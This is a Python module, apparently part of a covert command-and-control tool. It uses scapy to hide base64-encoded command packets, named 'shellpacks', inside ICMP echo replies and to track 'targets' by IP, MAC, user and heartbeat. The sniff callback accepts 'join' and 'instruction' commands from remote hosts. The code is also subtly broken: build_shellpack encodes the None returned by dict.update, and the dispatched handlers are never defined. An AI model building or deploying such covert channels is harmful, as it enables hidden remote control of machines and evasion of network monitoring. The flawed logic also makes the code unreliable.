from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import socket
import psutil
import pwd
import ast
import base64

TTL = int(64)
ICMP_ID = int(12800)

class Host:
    def __init__(self):
        self.ip = get_local_ip()
        self.iface = get_iface(self.ip)
        self.mac = get_mac(self.iface)
        self.user = pwd.getpwuid(os.getuid())[0]
        self.status = "STANDBY"

    def __str__(self) -> str:
        report =  f"[ Host Information ]\n"
        report += f" -- IP: {self.ip}\n"
        report += f" -- MAC: {self.mac}\n"
        report += f" -- Interface: {self.iface}\n"

        return report

    def sniff_callback(self, packet):
        # Parses out things that shouldn't be there

        if packet[ICMP].type != 0:
            return
        elif packet[IP].src == self.ip:
            return
        elif packet[ICMP].id != ICMP_ID:
            return
        elif not packet[Raw].load:
            return

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        print(f" $ {unpacked['command']} received from {unpacked['ip']} > {unpacked['message']}")

        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case "instruction":
                self.instruction(unpacked)
            case _:
                print("Default case")

    def build_shellpack(self, command: str, message: str | None = None, data: str | None = None) -> dict:
        shellpack = {
            "command": command,
            "message": message,
            "data" : data
            }
        
        info_dict = self.to_dict()
        shellpack = shellpack.update(info_dict)
        shellpack = str(shellpack).encode('utf-8')
        shellpack = base64.b64encode(shellpack)
        return shellpack
    
    def to_dict(self) -> dict:
        
        out_dict = {
                "ip": self.ip,
                "mac": self.mac,
                "iface": self.iface,
                "user": self.user,
                "status": self.status
                }

        return out_dict
        

    def update_status(self, status):
        self.status = status
        print(f" - Status of target {self.ip} has been updated to {status}")

    def send(self, ip, command: str, message: str | None = None, data: str | None = None) -> bool:
        shellpack = self.build_shellpack(command, message, data)
        data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
        sr(data, timeout=0, verbose=0)
        
        return True

class Target(Host):
    def __init__(self, shellpack):
        self.ip = shellpack['ip']
        self.iface = shellpack['iface']
        self.mac = shellpack['mac']
        self.user = shellpack['user']
        self.status = ""
        self.update_status("STANDBY")
        self.heartbeat = 0

    def update_status(self, status):
        self.status = status
        print(f" - Status of target {self.ip} has been updated to {status}")

def get_iface(ip) -> str:
    nics = psutil.net_if_addrs()
    iface = [i for i in nics for j in nics[i] if j.address==ip and j.family==socket.AF_INET][0]
    return iface
    
def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("192.255.255.255", 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_mac(iface) -> str:
    nics = psutil.net_if_addrs()
    mac = ([j.address for i in nics for j in nics[i] if i==iface and j.family==psutil.AF_LINK])[0]
    return mac.replace('-',':')
